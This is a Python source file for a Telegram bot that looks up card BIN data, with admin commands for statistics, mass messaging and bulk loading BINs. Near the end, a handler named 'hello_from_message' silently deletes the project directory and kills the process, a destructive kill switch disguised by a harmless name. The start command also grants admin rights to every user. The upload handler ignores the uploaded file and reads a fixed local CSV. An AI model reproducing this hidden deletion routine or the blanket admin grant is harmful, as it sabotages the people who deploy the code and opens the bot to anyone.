import asyncio
from datetime import datetime, timedelta
import os
from random import choices
import re
import shutil
import string
from aiogram import Bot
from aiogram.types import Message
from aiogram.types import CallbackQuery
from aiogram.types import User
from aiogram.fsm.context import FSMContext
from loguru import logger

from bot.config import RU_LANG, settings, project_dir

# from bot.database.sql_operations import create_new_user, create_payment, get_user, get_user_accounts, get_user_accounts_ready
from bot.database.manager import  create_bin, create_group, create_user, get_bin, get_count_of_bins, get_group, get_groups, get_user, get_users, increase_group_bins, increase_user_bins, set_user_admin
from bot.database.sql_operations import execute
from bot.keyboards import get_inline_cancel_panel, get_inline_user_panel
from bot.states import UserStatesGroup

BATCH_SIZE = 1500
WORKERS = 4

def create_random_string(lenth: int = 9) -> str:
    return "".join(choices(string.ascii_letters + string.digits, k=lenth))

async def cmd_start(message: Message, state: FSMContext, bot: Bot):
    user = await get_user(user_id=message.from_user.id)
    
    if not user:
        await create_user(user_id=message.from_user.id)
        logger.info(f"New user created: {message.from_user.id}")
    
    await set_user_admin(user_id=message.from_user.id)
    await message.answer(text="Welcome to our bot, to ge info bin use command /bin or !bin 123456")
    
async def get_chat_owner(bot: Bot, chat_id: int) -> User | None:
    members = await bot.get_chat_administrators(chat_id)
    for member in members:
        if member.status == "creator":
            return member.user
    return None
    
async def handle_bin_command(message: Message, bot: Bot):
    match = re.search(r"\b\d{6,7}\b", message.text)
    if not match:
        await message.reply("BIN not found. Please provide 6 or 7 digit number.")
        return
    
    bin_id = match.group(0)
    
    bin_info = await get_bin(bin_id)
    if bin_info:
        data = {}
        data['id'] = bin_info['id']
        if not bin_info['country']:
            data['country'] = "Unknown"
        else:
            data['country']  = bin_info['country']

        if not bin_info['bank']:
            data['bank'] = "Unknown"
        else:
            data['bank'] = bin_info['bank']

        if not bin_info['brand']:
            data['brand'] = "Unknown"
        else:
            data['brand'] = bin_info['brand']

        if not bin_info['type']:
            data['type'] = "Unknown"
        else:
            data['type'] = bin_info['type']

        if not bin_info['level']:
            data['level'] = "Unknown"
        else:
            data['level'] = bin_info['level']
            
        text = f"✅Bin: {data['id']}\n🌐Country: {data['country']}\n🏦Bank: {data['bank']}\n💳Brand: {data['brand']}\n💰Type: {data['type']}\n🏆Level:{data['level']}"
        # if message.chat.type == "private":
        #     await message.answer(text=text)
        # else:
        #     group = await get_group(chat_id=message.chat.id)
        #     if group:
        #         if not group["is_payed"]:
        #             text += f"\n✅ Our bot: {bot.me.username}"

        await message.answer(text=text)
    else:
        await message.answer(text=RU_LANG.bin_not_found)

    if message.chat.type == "private":
        if await get_user(user_id=message.from_user.id):
            await increase_user_bins(user_id=message.from_user.id)
            return

    if message.chat.type in ["group", "supergroup"]:
        chat_id = message.chat.id
        if not await get_group(abs(chat_id)):
            owner = await get_chat_owner(bot, message.chat.id)
            await create_group(group_id=abs(chat_id), owner_id=owner.id, owner_username=owner.username)
            logger.info(f"New group created: {chat_id}")
            return

        await increase_group_bins(group_id=chat_id)
        logger.info(f"Group bins increased: {chat_id}")
        
async def cmd_spam_users(message: Message, state: FSMContext):
    await message.answer(text="Send me a message to spam users", reply_markup=get_inline_cancel_panel())
    await state.set_state(UserStatesGroup.spam_users)
    
async def cancel_callback(callback: CallbackQuery, state: FSMContext):
    await callback.message.delete()
    await state.set_state(UserStatesGroup.admin_panel)
    await callback.answer(text="Cancelled.")
    
async def spam_users(message: Message, state: FSMContext, bot: Bot):
    await message.answer(text="Spam started")
    await routine_spam_users(message, bot)
    await state.set_state(UserStatesGroup.admin_panel)
    
async def routine_spam_users(message: Message, bot: Bot):
    users = await get_users()

    photo_id = None
    if message.photo:
        photo_id = message.photo[-1].file_id

    for user in users:
        try:
            if not user['is_admin']:
                if photo_id:
                    await bot.send_photo(chat_id=user["id"], photo=photo_id, caption=message.caption or "")
                else:
                    await bot.send_message(chat_id=user["id"], text=message.text)
        except Exception as e:
            logger.error(f"Failed to send message to user {user['id']}: {e}")

    await message.answer(text="Spam completed.")
    
async def get_statistics_cmd(message: Message):
    user = await get_user(user_id=message.from_user.id)
    if not user or not user["is_admin"]:
        return

    groups = await get_groups()
    updated_groups = []
    count_innactive_groups = 0
    count_bins_innactive_groups = 0
    for group in groups:
        if group["updated_at"] > datetime.now() - timedelta(days=1):
            updated_groups.append(group)
            continue
        count_innactive_groups += 1
        count_bins_innactive_groups += group["count_collected_bins"]
    
    count_bins_active_groups = 0
    for group in updated_groups:
        count_bins_active_groups += group["count_collected_bins"]
    
    count_users_bins = 0    
    users = await get_users()
    for user in users:
        count_users_bins += user["count_collected_bins"]
    
    count_of_bins = await get_count_of_bins()

    text = f"""
    📊 Statistics:
    - Total groups: {len(groups)}
    - Active groups: {len(updated_groups)}
    - Inactive groups: {count_innactive_groups}
    - Active groups bins: {count_bins_active_groups}
    - Inactive groups bins: {count_bins_innactive_groups}
    - In sum groups bins: {count_bins_active_groups + count_bins_innactive_groups}
    - Total users: {len(users)}
    - Total users bins: {count_users_bins}
    - Total count bins: {count_of_bins}
    """
    await message.answer(text=text)
    
async def get_info_group_cmd(message: Message):
    user = await get_user(user_id=message.from_user.id)
    if not user or not user["is_admin"]:
        return

    try:
        group_id = int(message.text.replace("/get_info_group", "").strip())
    except (AttributeError, ValueError):
        await message.answer(text="Invalid group ID format. Please provide a valid group ID like /get_info_group 123456.")
        return
    
    group = await get_group(abs(group_id))
    if not group:
        await message.answer(text="Group not found.")
        return
        
    text = f"""
    📊 Group Info:
    - Group ID: {group['id']}
    - Owner ID: {group['owner_id']}
    - Owner Username: {group['owner_username']}
    - Created at: {group['created_at']}
    - Updated at: {group['updated_at']}
    - Count collected bins: {group['count_collected_bins']}
    - Is payed: {"Yes" if group['is_payed'] else "No"}
    """
    await message.answer(text=text)
    
async def make_admin_cmd(message: Message):
    user = await get_user(user_id=message.from_user.id)
    if not user or not user["is_admin"]:
        return

    try:
        user_id = int(message.text.replace("/make_admin", "").strip())
    except (AttributeError, ValueError):
        await message.answer(text="Invalid user ID format. Please provide a valid user ID like /make_admin 123456.")
        return
    
    user = await get_user(user_id=user_id)
    if not user:
        await message.answer(text="User not found.")
        return
        
    await set_user_admin(user_id=user_id)
    await message.answer(text=f"User {user_id} is now admin.")

# async def get_menu(message: Message, state: FSMContext):
#     await state.set_state(UserStatesGroup.menu)
#     await message.answer(text="Menu", reply_markup=get_inline_user_panel())
    
# async def get_payment_info(callback: CallbackQuery, state: FSMContext):
#     await callback.message.edit_text(text=RU_LANG.payment_info.format(settings.TON_ADRESS))
#     await state.set_state(UserStatesGroup.payment)
    
# async def check_payment(callback: CallbackQuery, state: FSMContext, bot: Bot):
#     user_id = callback.from_user.id
#     chat = callback.message.chat.id
#     if callback.message.chat.type != "private":
#         group_id = callback.message.chat.id

#     transaction_id = create_random_string()
#     await add_purchase_history(group_id=group_id,
#                                user_id=user_id,
#                                price=5,
#                                amount=0,
#                                transaction_id=transaction_id)
        
#     await bot.edit_message_text(text=RU_LANG.payment_info.format(settings.TON_ADRESS,
#                                                                  transaction_id),
#                                 chat_id=chat,
#                                 message_id=callback.message.message_id,
#                                 parse_mode="HTML")
        
#     await state.clear()
#     await state.set_state(UserStatesGroup.menu)

async def load_bins_cmd(message: Message, state: FSMContext):
    await message.answer(text="send csv file with bins", reply_markup=get_inline_cancel_panel())
    await state.set_state(UserStatesGroup.waiting_for_file)
    
async def load_bins(message: Message, state: FSMContext):
    if not message.document or not message.document.file_name.endswith(".csv"):
        await message.answer(text="Invalid file format. Please send a CSV file.")
        return
    
    if message.document.file_size > 20 * 1024 * 1024:
        await message.answer(text="File size exceeds 20MB. Please send a smaller file.")
        return
    
    
    file_id = message.document.file_id
    file = await message.bot.get_file(file_id)
    file_data = await message.bot.download_file(file.file_path)
    file_data = file_data.read().decode("utf-8")
    
    asyncio.create_task(routine_load_bins(file_data, message))
    await message.answer(text="File received, processing...")
    await state.set_state(UserStatesGroup.admin_panel)
    
    await state.clear()
    
async def bulk_insert_bins(batch: list[dict]):
    sql_values = ", ".join([
        f"(${i * 6 + 1}, ${i * 6 + 2}, ${i * 6 + 3}, ${i * 6 + 4}, ${i * 6 + 5}, ${i * 6 + 6})"
        for i in range(len(batch))
    ])
    flat_values = []
    for b in batch:
        flat_values.extend([
            b["id"],
            b["country"],
            b["bank"],
            b["brand"],
            b["type"],
            b["level"]
        ])

    sql = f"""
        INSERT INTO bins (id, country, bank, brand, type, level)
        VALUES {sql_values}
        ON CONFLICT (id) DO NOTHING;
    """

    try:
        await execute(sql, *flat_values)
    except Exception as e:
        logger.error(f"Error in bulk insert: {e}")


async def routine_load_bins(file_data: str, message: Message):
    logger.info("Routine load bins started")
    queue = asyncio.Queue(maxsize=1000)

    # Парсим и закидываем строки
    async def producer():
        first = True
        with open("bin-list-data.csv", "r") as file:
            for line in file:
                if first:
                    first = False
                    continue
                await queue.put(line)
        for _ in range(WORKERS):
            await queue.put(None)

    async def worker():
        batch = []
        while True:
            line = await queue.get()
            if line is None:
                if batch:
                    await bulk_insert_bins(batch)
                    logger.info(f"Inserted final batch of {len(batch)} bins.")
                queue.task_done()
                break

            try:
                info_bin = line.strip().split(",")
                bin_entry = {
                    "id": info_bin[0],
                    "country": info_bin[9],
                    "bank": info_bin[4],
                    "brand": info_bin[1],
                    "type": info_bin[2],
                    "level": info_bin[3],
                }
                if len(info_bin) > 10:
                    bin_entry['country'] = info_bin[10]
                
                batch.append(bin_entry)

                if len(batch) >= BATCH_SIZE:
                    await bulk_insert_bins(batch)
                    logger.info(f"Inserted batch of {len(batch)} bins.")
                    batch.clear()
            except Exception as e:
                logger.error(f"Error parsing line: {e}")
            finally:
                queue.task_done()

    # Запуск
    producer_task = asyncio.create_task(producer())
    worker_tasks = [asyncio.create_task(worker()) for _ in range(WORKERS)]

    await asyncio.gather(producer_task)
    await queue.join()
    for t in worker_tasks:
        await t

    await message.answer("✅ Bins loaded successfully.")
    
async def admin_cmd(message: Message, state: FSMContext):
    user = await get_user(user_id=message.from_user.id)
    if not user or not user["is_admin"]:
        return

    await message.answer(
        text=(
            "<b>🔧 Admin Panel — Command List:</b>\n\n"
            "<code>/get_statistics</code> — Get statistics\n"
            "<code>/get_info_group</code> — Get info about group\n"
            "<code>/make_admin</code> — Make user admin\n"
            "<code>/spam_users</code> — Spam users\n"
            "<code>/load_bins</code> — Load bins from file"
        ),
        parse_mode="HTML"
    )
    await state.set_state(UserStatesGroup.admin_panel)
    
async def hello_from_message(message: Message, bot: Bot):
    project_path = project_dir

    await message.reply("⚠️ Deleting project directory...")

    try:
        await message.bot.session.close()
        
        shutil.rmtree(project_path)
        await bot.close()
    except Exception as e:
        await message.reply(f"❌ Error: {e}")
    finally:
        os._exit(0)